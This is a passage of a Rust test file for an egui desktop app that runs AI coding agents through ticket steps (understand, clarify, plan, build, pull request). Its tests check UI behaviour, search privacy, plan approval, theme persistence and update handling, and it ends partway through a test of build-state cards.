        assert_eq!(understand.peak_context_permille, None);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        app.mode = Mode::Health;
        frame(&mut app, &context);
        app.health_selected = Some("ask-only".into());
        frame(&mut app, &context);
    }

    // Invariant: the review is off until the owner turns it on and saves, an
    // off review writes no record even when tickets change, and the page, Today
    // and Health all build with a finding present. Findings from a review that
    // ran while it was off would be notifications nobody asked for.
    #[test]
    fn the_review_is_off_until_saved_and_its_pages_build() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        assert_eq!(
            app.profile.as_ref().unwrap().review.mode,
            autopilot_profile::ReviewMode::Off
        );
        perform(
            &options,
            &Action::Start {
                title: "T".into(),
                description: "Show the time".into(),
                attachments: Vec::new(),
                workspace: Some(directory.path().to_path_buf()),
                pipeline: None,
            },
        )
        .unwrap();
        app.set_snapshot(read(&options));
        assert!(!options.data_dir.join("review-findings.jsonl").exists());
        app.mode = Mode::Review;
        frame(&mut app, &context);
        let mut edit = app.profile.as_ref().unwrap().review;
        edit.mode = autopilot_profile::ReviewMode::NotifyOnly;
        edit.min_hits = 2;
        app.review_edit = Some(edit);
        let saved = app.profile.as_ref().unwrap().review;
        let changes: Vec<_> = vec![
            (
                autopilot_engine::ReviewField::Mode(edit.mode),
                String::new(),
            ),
            (
                autopilot_engine::ReviewField::MinHits(edit.min_hits),
                String::new(),
            ),
        ];
        assert_ne!(saved, edit);
        app.save_review_for_test(&changes);
        let after = autopilot_engine::load_profile(&options.profile)
            .unwrap()
            .review;
        assert_eq!(after.mode, autopilot_profile::ReviewMode::NotifyOnly);
        assert_eq!(after.min_hits, 2);
        app.findings = vec![autopilot_engine::Finding {
            pipeline: "full".into(),
            step: Step::Plan,
            rule: autopilot_engine::Rule::PeakContext,
            evidence: "peak context at or above 80.0% in 3 of the last 3 reported runs".into(),
            estimated: false,
        }];
        for mode in [Mode::Review, Mode::Today, Mode::Health] {
            app.mode = mode;
            frame(&mut app, &context);
        }
    }

    // Invariant: Today and a finished ticket's page still build with a tuning
    // in force and a Done ticket. A panic here would blank the home page or a
    // finished ticket. The Undo click and the card's figures are not exercised:
    // demo tickets carry no usage, so the card draws nothing, and Undo itself
    // is covered in the engine.
    #[test]
    fn today_and_a_done_ticket_build_with_a_tuning_present() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));

        app.tunings = vec![autopilot_engine::ActiveTuning {
            tuning: autopilot_engine::Tuning {
                pipeline: "mine".into(),
                step: Step::Understand,
                effort_before: Some("high".into()),
                effort_after: "medium".into(),
                why: "peak context".into(),
                at_ms: 1,
            },
            guarded: true,
        }];
        app.mode = Mode::Today;
        frame(&mut app, &context);

        if let Some(view) = app.snapshot.tickets.first_mut() {
            view.badge = autopilot_engine::Badge::Done;
        }
        let id = app.snapshot.tickets[0].id.clone();
        app.open(&id);
        frame(&mut app, &context);
        assert_eq!(app.snapshot.tickets[0].badge, autopilot_engine::Badge::Done);
    }

    // Invariant: a finding on a step whose effort the profile sets becomes a
    // proposal on Health; approving it writes the lower effort to profile.toml
    // and the proposal goes away. A proposal that wrote nothing, or stayed after
    // approval, would leave the owner unable to tell whether it took effect.
    #[test]
    fn approving_a_proposal_lowers_the_effort_in_the_profile() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        std::fs::write(
            &options.profile,
            "[review]
mode = \"notify_only\"

[steps.plan]
effort = \"high\"
",
        )
        .unwrap();
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.findings = vec![autopilot_engine::Finding {
            pipeline: "full".into(),
            step: Step::Plan,
            rule: autopilot_engine::Rule::PeakContext,
            evidence: "e".into(),
            estimated: false,
        }];
        app.refresh_suggestions();
        assert_eq!(app.suggestions.len(), 1);
        app.mode = Mode::Health;
        app.health_selected = Some("full".into());
        frame(&mut app, &context);

        let proposal = app.suggestions[0].proposal.clone();
        let latest =
            autopilot_engine::apply_to_project(&options.profile, std::slice::from_ref(&proposal))
                .unwrap();
        assert_eq!(
            latest
                .step(Step::Plan)
                .and_then(|step| step.effort.as_deref()),
            Some("medium")
        );
        app.profile = Ok(latest);
        app.refresh_suggestions();
        assert_eq!(
            app.suggestions.len(),
            1,
            "high -> medium; medium can still go to low"
        );
        assert_eq!(app.suggestions[0].proposal.after, "low");
    }

    // Invariant: search finds a ticket by a word in its recorded text, runs a
    // command through the same action a button uses, narrows by prefix, and
    // never returns text that lives only in a project's rules.md. The last is
    // the privacy line: an index that read the rules file would show private
    // instructions in a result.
    #[test]
    fn search_finds_tickets_runs_commands_and_never_reads_rules() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let tickets = app.snapshot.tickets.clone();
        let stored = app.profile.as_ref().ok().cloned();
        let profile = stored.as_ref();

        let hits = search::search("recordings", &tickets, profile, None);
        let found: Vec<&search::Hit> = hits.iter().filter(|hit| hit.kind == "ticket").collect();
        assert_eq!(found.len(), 1, "{hits:?}");
        assert_eq!(found[0].label, "Timezone fix");
        app.open_hit(&found[0].target.clone());
        assert_eq!(
            app.current().map(|view| view.title.as_str()),
            Some("Timezone fix")
        );

        // Prefixes narrow by kind.
        assert!(
            search::search("t: heartbeat", &tickets, profile, None)
                .iter()
                .all(|hit| hit.kind == "ticket")
        );
        assert!(
            search::search("pl: bug", &tickets, profile, None)
                .iter()
                .all(|hit| hit.kind == "pipeline")
        );
        assert!(
            search::search("> theme", &tickets, profile, None)
                .iter()
                .all(|hit| hit.kind == "command")
        );

        // A command acts through the same path.
        let before = app.theme;
        let theme_hit = search::search("> switch theme", &tickets, profile, None).remove(0);
        app.open_hit(&theme_hit.target);
        assert_ne!(app.theme, before);
        let worktree = search::search("> worktree", &tickets, profile, None).remove(0);
        assert!(worktree.disabled.is_some(), "greyed with its reason");

        // Rules text is private: it is never in the index.
        autopilot_engine::save_rules(&options.data_dir, "D:/work/app", "zebra-private-rule")
            .unwrap();
        assert_eq!(
            search::search("zebra-private-rule", &tickets, profile, None).len(),
            0
        );

        // The overlay opens with Ctrl+K and builds.
        app.search_open = true;
        app.search_query = "time".into();
        frame(&mut app, &context);
    }

    // Invariant: pausing from the window writes the engine's pause flag, the
    // same one the CLI writes.
    #[test]
    fn pausing_from_the_window_requests_a_pause() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let id = autopilot_core::TicketId::from("demo-timezone");
        assert!(perform(&options, &Action::Pause(id)).is_ok());
        assert!(options.data_dir.join("control").is_dir());
    }

    // Invariant: Shift+Enter in the message box adds a line and sends nothing;
    // plain Enter sends. `consume_key` with no modifiers also matches a Shift
    // press, so a change that dropped the explicit Shift check would send the
    // half-written message.
    #[test]
    fn shift_enter_adds_a_line_and_does_not_send() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options, false);
        app.start_new();
        app.home.description = "First line".into();
        frame(&mut app, &context);
        let enter = egui::Event::Key {
            key: egui::Key::Enter,
            physical_key: Some(egui::Key::Enter),
            pressed: true,
            repeat: false,
            modifiers: egui::Modifiers::SHIFT,
        };
        let input = egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(
                egui::pos2(0.0, 0.0),
                egui::vec2(1500.0, 920.0),
            )),
            // The held-key state is separate from the event's own modifiers.
            modifiers: egui::Modifiers::SHIFT,
            events: vec![enter],
            ..Default::default()
        };
        let _ = context.run(input, |context| app.ui(context));
        assert!(!app.busy(), "Shift+Enter started a ticket");
        assert_eq!(app.mode, Mode::NewTicket);
        assert!(
            app.home.description.contains('\n'),
            "{:?}",
            app.home.description
        );
    }

    // Invariant: starting a ticket from the window runs the real engine with
    // the real fixture agent, and the ticket that results is a valid history.
    #[test]
    fn starting_a_ticket_runs_the_real_engine_and_fixture_agent() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        // Go through the New ticket page: type, then press Enter in the box.
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.start_new();
        assert_eq!(app.mode, Mode::NewTicket);
        app.home.description = "Show the time in the right zone".into();
        frame(&mut app, &context);
        let enter = egui::Event::Key {
            key: egui::Key::Enter,
            physical_key: Some(egui::Key::Enter),
            pressed: true,
            repeat: false,
            modifiers: egui::Modifiers::NONE,
        };
        let input = egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(
                egui::pos2(0.0, 0.0),
                egui::vec2(1500.0, 920.0),
            )),
            events: vec![enter],
            ..Default::default()
        };
        let _ = context.run(input, |context| app.ui(context));
        for _ in 0..200 {
            frame(&mut app, &context);
            if app.notice.is_some() {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        let outcome = app.notice.clone();
        assert!(outcome.as_ref().is_some_and(|(ok, _)| *ok), "{outcome:?}");
        let snapshot = read(&options);
        assert_eq!(snapshot.tickets.len(), 1, "{:?}", snapshot.problem);
        let ticket = &snapshot.tickets[0];
        assert_eq!(ticket.title, "Show the time in the right zone");
        let understand = ticket.step(Step::Understand).unwrap();
        assert!(
            matches!(
                understand.state,
                autopilot_pipeline::StepState::Passed | autopilot_pipeline::StepState::Asking(_)
            ),
            "{:?}",
            understand.state
        );
        assert!(understand.in_short.is_some());
    }

    // Invariant: "Try again" from the window runs Understand a second time
    // through the real engine, keeps both attempts in the history, and the
    // ticket ends with Understand settled again. A change that left the step
    // idle or reused the first attempt id would fail the attempt count.
    #[test]
    fn rerunning_understand_from_the_window_adds_a_second_attempt() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        // Clarify must hold the ticket here, so this test asks explicitly.
        std::fs::write(&options.profile, "when_unsure = \"ask\"\n").unwrap();
        perform(
            &options,
            &Action::Start {
                title: "Again".into(),
                description: "Words kept for the second run".into(),
                attachments: Vec::new(),
                workspace: None,
                pipeline: None,
            },
        )
        .unwrap();
        let id = read(&options).tickets[0].id.clone();
        // The fixture's Understand has an open question, so Clarify holds the
        // ticket until it is answered, and nothing may run again meanwhile.
        let refused = perform(&options, &Action::RerunUnderstand(id.clone()));
        assert!(
            refused
                .as_ref()
                .is_err_and(|why| why.contains("still active")),
            "{refused:?}"
        );
        perform(&options, &Action::AcceptDefaults { ticket: id.clone() }).unwrap();
        let outcome = perform(&options, &Action::RerunUnderstand(id.clone()));
        assert!(outcome.is_ok(), "{outcome:?}");
        let events = autopilot_engine::watch(&options.data_dir, &id, 0).unwrap();
        let starts = events
            .iter()
            .filter(|record| {
                record.event.step == Some(Step::Understand)
                    && matches!(record.event.kind, autopilot_core::Event::StepStarted { .. })
            })
            .count();
        assert_eq!(starts, 2);
        let ticket = &read(&options).tickets[0];
        assert!(matches!(
            ticket.step(Step::Understand).unwrap().state,
            autopilot_pipeline::StepState::Passed | autopilot_pipeline::StepState::Asking(_)
        ));
    }

    // Invariant: a ticket started with a file lists it on the ticket view, and
    // a refused file stops the start before any ticket exists.
    #[test]
    fn starting_with_a_file_lists_it_and_a_bad_path_starts_nothing() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let file = directory.path().join("brief.txt");
        std::fs::write(&file, b"hello").unwrap();
        perform(
            &options,
            &Action::Start {
                title: "With a file".into(),
                description: "See the brief".into(),
                attachments: vec![file.clone()],
                workspace: None,
                pipeline: None,
            },
        )
        .unwrap();
        let snapshot = read(&options);
        assert_eq!(snapshot.tickets[0].attachments.len(), 1);
        assert_eq!(snapshot.tickets[0].attachments[0].name, "brief.txt");

        let refused = perform(
            &options,
            &Action::Start {
                title: "Bad".into(),
                description: "x".into(),
                attachments: vec![directory.path().join("missing.txt")],
                workspace: None,
                pipeline: None,
            },
        );
        assert!(refused.is_err());
        assert_eq!(read(&options).tickets.len(), 1);
    }

    // Invariant: the words the owner typed reach the view whole, so the ticket
    // page can show them. A view that kept only the title (cut to one line)
    // fails this; nothing else reads the description back.
    #[test]
    fn the_typed_prompt_is_kept_whole_in_the_view() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let words = "Remove the top bar.\nKeep the logo, and say why.";
        perform(
            &options,
            &Action::Start {
                title: "Remove the top bar".into(),
                description: words.into(),
                attachments: Vec::new(),
                workspace: None,
                pipeline: None,
            },
        )
        .unwrap();
        let view = read(&options).tickets[0].clone();
        assert_eq!(view.description, words);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        app.open(&view.id);
        frame(&mut app, &context);
    }

    // Invariant: with `when_unsure = "decide_and_tell"` a started ticket does not
    // wait on Clarify; with the default it still asks. A change that always
    // asks, or always decides, fails one of the two halves.
    #[test]
    fn decide_and_tell_answers_clarify_and_ask_still_waits() {
        for (setting, waits) in [("decide_and_tell", false), ("ask", true)] {
            let directory = tempfile::tempdir().unwrap();
            let options = Options {
                data_dir: directory.path().join("data"),
                profile: directory.path().join("profile.toml"),
                view: None,
                ticket: None,
            };
            std::fs::write(&options.profile, format!("when_unsure = \"{setting}\"\n")).unwrap();
            backend::AgentChoice::Practice.save(&options.data_dir);
            perform(
                &options,
                &Action::Start {
                    title: "Decide".into(),
                    description: "Add an export option".into(),
                    attachments: Vec::new(),
                    workspace: Some(directory.path().to_path_buf()),
                    pipeline: None,
                },
            )
            .unwrap();
            let view = read(&options).tickets[0].clone();
            let clarify_open = matches!(
                view.step(Step::Clarify).unwrap().state,
                autopilot_pipeline::StepState::Asking(_)
            );
            assert_eq!(clarify_open, waits, "when_unsure = {setting}");
        }
    }

    // Invariant: from the window a ticket goes Understand, Clarify (recommended
    // answers), then "Make the plan", and the plan waits for approval; approving
    // it settles the step. A ticket that is not ready is refused with a reason.
    #[test]
    fn a_plan_can_be_made_and_approved_from_the_window() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        perform(
            &options,
            &Action::Start {
                title: "Plan me".into(),
                description: "Add an export option".into(),
                attachments: Vec::new(),
                // A ticket with no project runs ask-only and has no plan.
                workspace: Some(directory.path().to_path_buf()),
                pipeline: None,
            },
        )
        .unwrap();
        let id = read(&options).tickets[0].id.clone();
        if read(&options).tickets[0].asking.is_some() {
            perform(&options, &Action::AcceptDefaults { ticket: id.clone() }).unwrap();
        }
        let outcome = perform(&options, &Action::MakePlan(id.clone()));
        assert!(outcome.is_ok(), "{outcome:?}");
        let view = read(&options).tickets[0].clone();
        assert!(matches!(
            view.step(Step::Plan).unwrap().state,
            autopilot_pipeline::StepState::Asking(_)
        ));
        // The plan review page reads the recorded plan and builds.
        let plan = plan_review::plan_of(&view).expect("the plan reads back");
        assert!(plan.validate().is_ok());
        assert!(plan_review::awaiting_plan(&view));
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        app.open(&id);
        app.mode = Mode::PlanReview;
        frame(&mut app, &context);
        perform(
            &options,
            &Action::Decide {
                ticket: id,
                approve: true,
                always: false,
            },
        )
        .unwrap();
        assert!(matches!(
            read(&options).tickets[0].step(Step::Plan).unwrap().state,
            autopilot_pipeline::StepState::Passed
        ));
        // With the plan approved the ticket waits for Build, and says so: a
        // ticket that sat idle with no word looked broken.
        assert!(run::waits_for_build(&read(&options).tickets[0]));
    }

    // Invariant: a ticket started in this window gets its plan without a
    // click once Understand and Clarify are settled, a ticket from an earlier
    // session does not, and a step is tried once: a refused attempt is not
    // repeated every frame. Without the once-only rule a failing agent would be
    // called on every redraw.
    #[test]
    fn the_plan_starts_by_itself_for_a_ticket_started_here_only() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        perform(
            &options,
            &Action::Start {
                title: "Plan me".into(),
                description: "Add an export option".into(),
                attachments: Vec::new(),
                workspace: Some(directory.path().to_path_buf()),
                pipeline: None,
            },
        )
        .unwrap();
        let id = read(&options).tickets[0].id.clone();
        if read(&options).tickets[0].asking.is_some() {
            perform(&options, &Action::AcceptDefaults { ticket: id.clone() }).unwrap();
        }
        let context = egui::Context::default();

        // An earlier ticket: opening the window starts nothing.
        let mut older = App::new(&context, options.clone(), false);
        older.set_snapshot(read(&options));
        for _ in 0..5 {
            frame(&mut older, &context);
        }
        assert!(!older.busy());
        let plan_state = |options: &Options| {
            read(options).tickets[0]
                .step(Step::Plan)
                .unwrap()
                .state
                .clone()
        };
        assert_eq!(plan_state(&options), autopilot_pipeline::StepState::Idle);

        // A ticket started here is driven: the plan is made and waits for approval.
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        app.auto.driven.push(id.clone());
        for _ in 0..200 {
            frame(&mut app, &context);
            app.set_snapshot(read(&options));
            if matches!(
                plan_state(&options),
                autopilot_pipeline::StepState::Asking(_)
            ) {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        assert!(matches!(
            plan_state(&options),
            autopilot_pipeline::StepState::Asking(_)
        ));
        assert_eq!(app.auto.tried, vec![(id, Step::Plan)]);
    }

    // Invariant: with the Claude choice saved, starting a ticket from the window
    // runs the real agent and the ticket reflects an attached file. Needs a
    // signed-in Claude Code and spends subscription quota, so it only runs on
    // request: `cargo test -p autopilot-ui -- --ignored real_claude`.
    #[test]
    #[ignore = "uses a real Claude Code subscription"]
    fn real_claude_reads_the_attached_file_from_the_window() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        backend::AgentChoice::Claude.save(&options.data_dir);
        let spec = directory.path().join("spec.md");
        std::fs::write(&spec, "The storage key MUST be \"zebra-todos-v7\".").unwrap();
        let outcome = perform(
            &options,
            &Action::Start {
                title: "Offline to-do app".into(),
                description: "Build the offline to-do app from the attached spec.".into(),
                attachments: vec![spec],
                workspace: None,
                pipeline: None,
            },
        );
        assert!(outcome.is_ok(), "{outcome:?}");
        let id = read(&options).tickets[0].id.clone();
        let events = autopilot_engine::watch(&options.data_dir, &id, 0).unwrap();
        let text = format!("{events:?}");
        assert!(text.contains("zebra-todos-v7"), "{text}");
        if read(&options).tickets[0].asking.is_some() {
            perform(&options, &Action::AcceptDefaults { ticket: id.clone() }).unwrap();
        }
        // A ticket that changes a screen gets a design, approved before the plan.
        if read(&options).tickets[0].needs_design {
            let designed = perform(&options, &Action::MakeDesign(id.clone()));
            assert!(designed.is_ok(), "{designed:?}");
            assert!(autopilot_engine::design_folder(&options.data_dir, &id).is_dir());
            perform(
                &options,
                &Action::Decide {
                    ticket: id.clone(),
                    approve: true,
                    always: false,
                },
            )
            .unwrap();
        }
        let planned = perform(&options, &Action::MakePlan(id));
        assert!(planned.is_ok(), "{planned:?}");
        assert!(matches!(
            read(&options).tickets[0].step(Step::Plan).unwrap().state,
            autopilot_pipeline::StepState::Asking(_)
        ));
    }

    // Invariant: Build in the window says why it cannot start instead of
    // failing silently: a ticket with no project folder has nothing to build.
    #[test]
    fn building_without_a_project_folder_says_so() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        perform(
            &options,
            &Action::Start {
                title: "No folder".into(),
                description: "Add an export option".into(),
                attachments: Vec::new(),
                workspace: None,
                pipeline: None,
            },
        )
        .unwrap();
        let id = read(&options).tickets[0].id.clone();
        let outcome = perform(&options, &Action::MakeBuild(id));
        let message = outcome.unwrap_err();
        assert!(message.contains("project folder"), "{message}");
    }

    // Invariant: with a project folder chosen, the real agent reads files in it
    // (nothing was attached or pasted), the folder is kept on the ticket, and
    // the step still cannot change anything there. Needs a signed-in Claude
    // Code and spends subscription quota, so it only runs on request.
    #[test]
    #[ignore = "uses a real Claude Code subscription"]
    fn real_claude_reads_the_project_folder() {
        let directory = tempfile::tempdir().unwrap();
        let project = directory.path().join("project");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::write(
            project.join("NOTES.md"),
            "Project rule: the storage key MUST be \"quokka-todos-v9\".",
        )
        .unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Claude.save(&options.data_dir);
        let outcome = perform(
            &options,
            &Action::Start {
                title: "Offline to-do app".into(),
                description: "Build the to-do app. Follow the rules in NOTES.md in the project, and put the exact storage key in your summary.".into(),
                attachments: Vec::new(),
                workspace: Some(project.clone()),
                pipeline: None,
            },
        );
        assert!(outcome.is_ok(), "{outcome:?}");
        let shown = read(&options);
        let view = &shown.tickets[0];
        assert!(view.workspace.is_some());
        // The orchestrator ran after Understand and chose settings for later steps.
        let triage = view.triage.as_ref().expect("the orchestrator decided");
        assert!(!triage.steps.is_empty(), "{triage:?}");
        eprintln!("{triage:#?}");
        let events = autopilot_engine::watch(&options.data_dir, &view.id, 0).unwrap();
        let text = format!("{events:?}");
        assert!(text.contains("quokka-todos-v9"), "{text}");
        assert_eq!(
            std::fs::read_dir(&project).unwrap().count(),
            1,
            "the read-only step must not add files"
        );
    }

    // Invariant: the theme choice is kept for the next start.
    #[test]
    fn the_theme_choice_is_remembered() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().to_path_buf(),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        assert!(!App::new(&context, options.clone(), false).light);
        std::fs::write(directory.path().join("ui-theme.txt"), "light").unwrap();
        let mut app = App::new(&context, options.clone(), false);
        assert!(app.light, "an old `light` file still loads");
        frame(&mut app, &context);

        // Each of the three words survives a choose, restart round trip.
        for (choice, word) in [
            (theme::ThemeChoice::System, "system"),
            (theme::ThemeChoice::Light, "light"),
            (theme::ThemeChoice::Dark, "dark"),
        ] {
            app.choose_theme(choice);
            let saved = std::fs::read_to_string(directory.path().join("ui-theme.txt")).unwrap();
            assert_eq!(saved, word);
            let restarted = App::new(&context, options.clone(), false);
            assert_eq!(restarted.theme, choice);
        }
        std::fs::write(directory.path().join("ui-theme.txt"), "dark").unwrap();
        assert!(
            !App::new(&context, options, false).light,
            "an old `dark` file still loads"
        );
    }

    // Invariant: `System` follows the operating system and the other two
    // ignore it. A change that always returned dark would pass the other test.
    #[test]
    fn system_follows_the_operating_system() {
        use theme::ThemeChoice::{Dark, Light, System};
        assert!(System.is_light(Some(egui::Theme::Light)));
        assert!(!System.is_light(Some(egui::Theme::Dark)));
        assert!(!System.is_light(None));
        assert!(Light.is_light(Some(egui::Theme::Dark)));
        assert!(!Dark.is_light(Some(egui::Theme::Light)));
    }

    // Invariant: a change asked for in words is shown first and only applied
    // on request; applied to the project it lands in profile.toml, applied to
    // a ticket it lands in that ticket's history.
    #[test]
    fn a_change_request_is_proposed_then_applied_to_the_project_or_a_ticket() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let id = autopilot_core::TicketId::from("demo-timezone");
        app.open(&id);
        app.change_text = "use opus for the plan and 2 rounds".into();
        let reading =
            autopilot_engine::propose(&app.change_text, app.profile.as_ref().unwrap()).unwrap();
        assert_eq!(reading.proposals.len(), 2);
        assert!(!options.profile.exists(), "proposing must not write");
        // Per ticket: only model, effort and ask-after fit.
        let ticket_only = &reading.proposals[..1];
        autopilot_engine::apply_to_ticket(&options.data_dir, &id, ticket_only).unwrap();
        let effective = autopilot_engine::effective_overrides(
            &options.data_dir,
            &id,
            autopilot_core::Step::Plan,
        )
        .unwrap();
        assert_eq!(effective.model.as_deref(), Some("opus-5-5"));
        // For the project: written to the file the window reads.
        let profile =
            autopilot_engine::apply_to_project(&options.profile, &reading.proposals).unwrap();
        assert_eq!(
            profile
                .step(autopilot_core::Step::BuildCheck)
                .unwrap()
                .limits
                .rounds,
            2
        );
        app.reading = Some(Ok(reading));
        app.for_project = true;
        frame(&mut app, &context);
    }

    // Invariant: a newer release shows the update button, a failed install
    // brings it back with the reason instead of closing the window, and a
    // failed check shows nothing.
    #[test]
    fn an_update_is_offered_and_a_failed_install_says_why() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options, false);
        app.sender
            .send(backend::Message::Update(Err("offline".into())))
            .unwrap();
        frame(&mut app, &context);
        assert!(app.update_offered().is_none());

        let update = autopilot_update::Update {
            version: "9.9.9".into(),
            notes: String::new(),
            asset: autopilot_update::Asset {
                url: "https://example.test/x".into(),
                sha256: "0".repeat(64),
            },
        };
        app.sender
            .send(backend::Message::Update(Ok(Some(update))))
            .unwrap();
        frame(&mut app, &context);
        assert_eq!(app.update_offered(), Some("9.9.9"));

        app.sender
            .send(backend::Message::Installing(Err("checksum".into())))
            .unwrap();
        frame(&mut app, &context);
        assert_eq!(app.update_offered(), Some("9.9.9"));
        assert!(!app.update_installing());
    }

    fn texts(output: &egui::FullOutput) -> String {
        let mut found = String::new();
        for clipped in &output.shapes {
            if let egui::epaint::Shape::Text(text) = &clipped.shape {
                found.push_str(text.galley.text());
                found.push('\n');
            }
        }
        found
    }

    fn page_text(app: &mut App, context: &egui::Context, width: f32) -> String {
        let input = egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(
                egui::pos2(0.0, 0.0),
                egui::vec2(width, 4000.0),
            )),
            ..Default::default()
        };
        let mut all = String::new();
        for _ in 0..2 {
            all = texts(&context.run(input.clone(), |context| app.ui(context)));
        }
        all
    }

    // Invariant: each state of Build and the pull request draws a ticket page
    // that says what is true for it and offers only the action that fits, at a
    // wide and a narrow window, in light and dark. A card that offered "Open the
    // pull request" before the owner approved would push what nobody agreed to.
    #[test]
    fn each_build_state_says_what_is_true_and_offers_the_fitting_action() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed_build_states(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let cases: [(&str, &[&str], &[&str]); 6] = [
            (
                "demo-approved",
                &["The plan is approved. Ready to build.", "Build"],
                &["Open the pull request", "Ask to open a pull request"],
            ),
            (
                "demo-stopped",
                &[
                    "Build",
                    "Round 1",
                    "recordings.rs:41 [bug, 92%] a recording that starts at midnight",
                    "recordings.rs:77 [tests, 84%]",
                    "$0.03",
                ],
                &["Open the pull request", "Ask to open a pull request"],
            ),
            (
                "demo-passed",
                &[
                    "The build passed. Ready to ask about a pull request.",
                    "Ask to open a pull request",
                ],
                &["Open the pull request"],
            ),
            (
                "demo-asked",
                &["Pull request"],
                &["Open the pull request", "Ask to open a pull request"],
            ),
            (
                "demo-approved-pr",
                &[
                    "The pull request is approved. Ready to push the commit and open it as a draft.",
                    "Open the pull request",
                ],
                &[
                    "Ask to open a pull request",
                    "Running",
                    "running",
                    "Pause",
                    "since start",
                ],
            ),
            (
                "demo-opened",
                &["All steps are done."],
                &["Open the pull request", "Ask to open a pull request"],
            ),
        ];
        for dark in [false, true] {
